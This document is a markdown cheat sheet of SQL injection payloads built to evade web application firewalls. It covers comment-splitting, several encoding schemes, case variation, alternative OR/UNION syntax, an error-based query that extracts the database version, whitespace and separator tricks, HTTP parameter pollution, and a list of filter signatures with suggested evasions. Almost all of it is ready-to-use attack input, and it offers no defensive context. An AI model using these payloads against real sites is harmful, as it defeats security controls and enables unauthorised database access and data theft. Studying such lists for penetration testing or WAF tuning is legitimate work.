# WAF Evasion Techniques

## Comment-Based Bypass

### MySQL
```
' /*!50000OR*/ '1'='1
' /*!UNION*/ /*!SELECT*/--
' /*!50000UNION*/ /*!50000SELECT*/--
'/**/OR/**/1=1
```

### Generic SQL
```
'/**/OR/**/'1'='1
'/*comment*/OR/*comment*/1=1
'UN/**/ION SEL/**/ECT--
```

## Encoding Bypass

### URL Encoding
```
%27%20OR%20%271%27%3D%271
%27%20UNION%20SELECT%20NULL--
```

### Double URL Encoding
```
%2527%2520OR%2520%25271%2527%253D%25271
```

### Unicode Encoding
```
\u0027 OR \u00271\u0027=\u00271
```

### HTML Entity Encoding
```
&#39; OR &#39;1&#39;=&#39;1
```

### Hex Encoding (MySQL)
```
0x27204F52202731273D2731
```

## Case Variation
```
SeLeCt, UNION, Or, AnD
' uNiOn SeLeCt--
```

## Alternative Syntax

### OR alternatives
```
' || '1'='1       (MySQL concatenation)
' OR 1=1--
' OR 'a'='a
' OR ''='
```

### UNION alternatives (MySQL)
```
' UNION ALL SELECT--
' UNION DISTINCT SELECT--
```

### SELECT alternatives
```
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

## Space Bypass
```
%09   (Tab)
%0A   (Newline)
%0D   (Carriage return)
%A0   (Non-breaking space)
/**/  (Comment as space)
```

## Separator Bypass
```
'OR'1'='1
'OR+1=1
'OR\n1=1
```

## String Bypass
```
' OR 0x31=0x31--
' OR CHAR(49)=CHAR(49)--
```

## HPP (HTTP Parameter Pollution)
```
id=1&id=' OR 1=1--
# Some WAFs only check first/last parameter
```

## Common WAF Signatures to Avoid
- `SELECT` → Try: `SeLeCt`, `SEL/**/ECT`, `UNION SELECT`
- `FROM` → Try: `FR/**/OM`, `FROM`
- `WHERE` → Try: `WH/**/ERE`, `AND`
- `--` → Try: `#`, `/**/`, `%23`
- `'` → Try: `%27`, `%2527`, `\u0027`
